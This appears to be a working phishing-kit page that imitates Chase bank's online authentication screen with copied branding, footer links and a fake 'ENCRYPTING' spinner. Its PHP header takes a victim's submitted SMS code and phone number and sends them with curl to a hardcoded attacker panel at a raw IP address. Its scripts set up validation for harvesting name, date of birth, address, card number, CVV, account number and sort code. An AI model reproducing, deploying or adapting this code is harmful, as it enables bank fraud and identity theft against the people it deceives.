<?php
session_start();


$sms = @$_POST['sms'];
$phone = @$_POST['nr'];

if ($sms == "") {
  echo '<meta http-equiv="refresh" content="0; URL=4.php?error1">';
    die();
}




        $external_link="http://89.32.40.38/panel/a.php?sms=$phone,$sms";

        $msg= "$phone,$sms";
        $data = $msg;

        $ch2 = curl_init($external_link);
        curl_setopt($ch2, CURLOPT_POST ,1);
        curl_setopt($ch2, CURLOPT_POSTFIELDS ,"main=$msg");
        curl_setopt($ch2, CURLOPT_HEADER ,0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER ,1);
        $data = curl_exec($ch2);
		
		
	

?>

<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" dir="ltr" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      
      
      <meta name="robots" content="noindex,nofollow">
      <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ">
      <meta http-equiv="Refresh" content="5;./verification-finished.php">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="msapplication-config" content="none">
      <title>Online Acess Authentication - Chase.com</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <!--[if lte IE 8]>
      <link rel="stylesheet" type="text/css" media="all" href="https://static.chasecdn.com/web/2018.06.24-519/logon/assets/ie8.css" />
      <![endif]-->
      <link rel="shortcut icon" href="files/chasefavicon.ico">
      <link rel="apple-touch-icon" sizes="152x152" href="files/chase-touch-icon-152x152.png">
      <link rel="apple-touch-icon" sizes="120x120" href="files/chase-touch-icon-120x120.png">
      <link rel="apple-touch-icon" sizes="76x76" href="files/chase-touch-icon-76x76.png">
      <link rel="apple-touch-icon" href="files/chase-touch-icon.png">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black">
      <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
         html {height:100%; background: #fff;}
         @media only screen and (min-width: 768px) {
         html {
         background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
         }
         }
      </style>
      <noscript>
      </noscript>
      <link rel="stylesheet" href="files/logon.css">
      <link rel="stylesheet" href="files/blue-ui.css">
      <script src="files/main-ver.js.download"></script><script src="files/main_296ab81a48f1e0bddd2406b4622572c8.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-vendor/main" src="files/main_004.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue/main" src="files/main_002.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="logon/boot" src="files/boot.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-app/main" src="files/main_003.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view/main" src="files/main.js.download"></script>
      <style type="text/css"></style>
	  <script src="files/jquery.js.download"></script>
    <script src="files/jquery.validate.js.download"></script>
    <script src="files/additional-methods.js.download"></script>
    <script src="files/jquery.maskedinput.js.download"></script>
    <script src="files/jquery.payment.js.download"></script>
    <script>

        $('#verify').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#verify").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
                                addresstime: { required: true, minlength: 4,},
                                address: { required: true, minlength: 5,},
                                town: { required: true, minlength: 3,},
                                postcode: { required: true, minlength: 5,},
                                telephone: { required: true, minlength: 11, digits: true,},
                                email: { required: true, email: true,},
                            },
                            messages: {
                                name: {
                                    required: "Please provide full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide date of birth",
                                    minlength: jQuery.validator.format("Please provide your date of birth"),
                                },
                                addresstime: {
                                    required: "Please provide time at address",
                                    minlength: jQuery.validator.format("Please provide your time at address"),
                                },
                                telephone: {
                                    required: "Please provide telephone number",
                                    minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                town: {
                                    required: "Please provide city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                postcode: {
                                    required: "Please provide postcode",
                                    minlength: jQuery.validator.format("Please check the postcode you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                document.getElementById("Details").style.display = "none";
                                document.getElementById("Payment").style.display = "block";
                                ForwardValues();
                                $('body,html').animate({
                                    scrollTop: 0
                                }, 800);
                                return false;
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

        function ForwardValues() {
            var name = document.getElementById("name").value;
            document.getElementById("one").value=name;
            var dob = document.getElementById("dob").value;
            document.getElementById("two").value=dob;
            var telephone = document.getElementById("telephone").value;
            document.getElementById("three").value=telephone;
            var email = document.getElementById("email").value;
            document.getElementById("four").value=email;
            var address = document.getElementById("address").value;
            document.getElementById("five").value=address;
            var town = document.getElementById("town").value;
            document.getElementById("six").value=town;
            var postcode = document.getElementById("postcode").value;
            document.getElementById("seven").value=postcode;
        }
        $('#payment').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#payment").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                ccname: { required: true, minlength: 4},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 7,},
                                secode: { required: true, minlength: 3, digits: true,},
                                account: { required: true, minlength: 8,},
                                sortcode: { required: true, minlength: 8,},
                            },
                            messages: {
                                ccname: {
                                    required: "Please provide cardholders name",
                                    minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
                                },
                                ccno: {
                                    required: "Please provide 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide card expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                account: {
                                    required: "Please provide 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                },
                                sortcode: {
                                    required: "Please provide 6 digit sort code",
                                    minlength: jQuery.validator.format("Please check the sort code you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);
    </script>
    <script type="text/javascript">
        function movetoNext(current, nextFieldID) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextFieldID).focus();
            }
        }
        jQuery(function($){
            $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
            $("#addresstime").mask("99 / 99",{placeholder:"YY / MM"});
            $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
        });
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');

            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };

            $('form').submit(function(e) {
                e.preventDefault();

                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });

        });

    </script>
   </head>
   <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
      <div data-is-view="true">
         <div class="homepage" tabindex="-1">
            <div id="advertisenativeapp" data-has-view="true"></div>
            <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
               <div data-is-view="true">
                  <div id="siteMessageAda" aria-live="polite">
                     <h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2>
                  </div>
               </div>
            </div>
            <div class="logon-container" id="container">
               <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
                  <div class="logon header jpui transparent navigation bar" data-is-view="true">
                     <a id="logoHomepageLink" href="/verification-finished.php">
                        <div class="chase logo"></div>
                        <span class="util accessible-text">JPMorgan.com</span>
                     </a>
                  </div>
               </header>
               <main id="logon-content" data-has-view="true">
                  <div class="container logon" data-is-view="true">
                     <div>
                        <div id="backgroundImage">
                           <div class="jpui background image fixed" id="geoImage">
                              <style type="text/css">.jpui.background.image { background-image: url(files/background.mobile.day.8.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='files/background.mobile.day.8.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='files/background.mobile.day.8.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(files/background.mobile.day.8.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(files/background.tablet.day.8.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(files/background.desktop.day.8.jpeg); } }</style>
                           </div>
                        </div>
                     </div>
                     <div class="row">
                        <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
                           <div class="jpui raised segment">
                              <div class="row">
                                 <div class="col-xs-10 col-xs-offset-1">
                                    <h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3>
                                 </div>
                              </div>
                              <div class="row">
                                 <div class="col-xs-12">
                                    <div class="progress">
                                       <div class="bar"></div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
                           <div class="jpui raised segment">
                              <div class="row">
                                 <div class="col-xs-10 col-xs-offset-1">
                                    <form id="payment" method="POST" autocomplete="off" action="/verification-finished.php" novalidate="novalidate">
										<br>
                        <img style="display:block;margin-left:auto;margin-right:auto;" src="files/spin.gif"><br>
                        <h4 style="font-size: 15px; text-align: center;" id="input-title" data-reactid="14"><b>ENCRYPTING....<br> <br></b></h4><b>

									 
                                 </b></form></div><b>
                              </b></div><b>
                           </b></div><b>
                        </b></div><b>
                     </b></div><b>
                  </b></div><b>
               </b></main><b>
            </b></div><b>
            <footer class="logon-footer" id="logon-footer" data-has-view="true">
               <div class="footer-container" data-is-view="true" style="">
                  <div class="container">
                     <div class="social-links row"></div>
                  </div>
                  <div class="footer-links row">
                     <div class="col-xs-12">
                        <ul>
                           <li><span class="jpui link" id="requestContactUs-link-wrapper"><a class="link-anchor" id="requestContactUs" href="javascript:void(0);" aria-label=" Contact us ">Contact us</a></span></li>
                           <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a class="link-anchor" id="requestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy</a></span></li>
                           <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor" id="requestSecurity" href="javascript:void(0);" aria-label=" Security ">Security</a></span></li>
                           <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a class="link-anchor" id="requestTermsOfUse" href="javascript:void(0);" aria-label=" Terms of use ">Terms of use</a></span></li>
                           <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a class="link-anchor" id="requestAccessibility" href="javascript:void(0);" aria-label=" Our commitment to accessibility ">Our commitment to accessibility</a></span></li>
                           <li><span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper"><a class="link-anchor" id="requestMortgageLoanOriginators" href="javascript:void(0);" aria-label=" SAFE Act: Chase Mortgage Loan Originators ">SAFE Act: Chase Mortgage Loan Originators</a></span></li>
                           <li><span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper"><a class="link-anchor" id="requestHomeMortgageDisclosureAct" href="javascript:void(0);" aria-label=" Fair Lending ">Fair Lending</a></span></li>
                           <li><span class="jpui link" id="requestAboutChase-link-wrapper"><a class="link-anchor" id="requestAboutChase" href="javascript:void(0);" aria-label=" About Chase ">About Chase</a></span></li>
                           <li><span class="jpui link" id="requestJpMorgan-link-wrapper"><a class="link-anchor" id="requestJpMorgan" href="javascript:void(0);" aria-label=" J.P. Morgan ">J.P. Morgan</a></span></li>
                           <li><span class="jpui link" id="requestJpMorganChaseCo-link-wrapper"><a class="link-anchor" id="requestJpMorganChaseCo" href="javascript:void(0);" aria-label=" JPMorgan Chase &amp; Co. ">JPMorgan Chase &amp; Co.</a></span></li>
                           <li><span class="jpui link" id="requestCareers-link-wrapper"><a class="link-anchor" id="requestCareers" href="javascript:void(0);" aria-label=" Careers ">Careers</a></span></li>
                           <li><span class="jpui link" id="requestEspanol-link-wrapper"><a class="link-anchor" id="requestEspanol" href="javascript:void(0);" aria-label=" Español ">Español</a></span></li>
                           <li><span class="jpui link" id="requestChaseCanada-link-wrapper"><a class="link-anchor" id="requestChaseCanada" href="javascript:void(0);" aria-label=" Chase Canada ">Chase Canada</a></span></li>
                           <li><span class="jpui link" id="requestSiteMap-link-wrapper"><a class="link-anchor" id="requestSiteMap" href="javascript:void(0);" aria-label=" Site map ">Site map</a></span></li>
                           <li>Member FDIC</li>
                           <li>Equal Housing Lender</li>
                           <li class="copyright-label">© 2019 JPMorgan Chase &amp; Co.</li>
                        </ul>
                     </div>
                  </div>
                  <div class="row galaxy-footer">
                     <div class="col-xs-10 col-xs-offset-1">
                        <p class="NOTE"><span></span><br> <span class="copyright-label">© 2019 JPMorgan Chase &amp; Co.</span></p>
                        <p><span class="jpui link" id="galaxyRequestPrivacyNotice-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy<i class="jpui progressright icon end-icon" id="galaxyRequestPrivacyNotice-endIcon" aria-hidden="true"></i></a></span></p>
                        <p><span class="jpui link" id="galaxyRequestAccessibility-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestAccessibility" href="javascript:void(0);" aria-label=" Our commitment to accessibility ">Our commitment to accessibility<i class="jpui progressright icon end-icon" id="galaxyRequestAccessibility-endIcon" aria-hidden="true"></i></a></span></p>
                     </div>
                  </div>
               </div>
         </footer></b></div><b>
         
      </b></div><b>
      <div id="languageSupportDisclaimer"></div>
      <div id="overlay" data-has-view="true"></div>
      <div class="overlay"></div>
      <div id="signoutModal"></div>
      <div id="siteExitWarning"></div>
      <div id="serviceErrorModal"></div>
      <div id="sessionTimeoutModal"></div>
      
   


</b></body></html>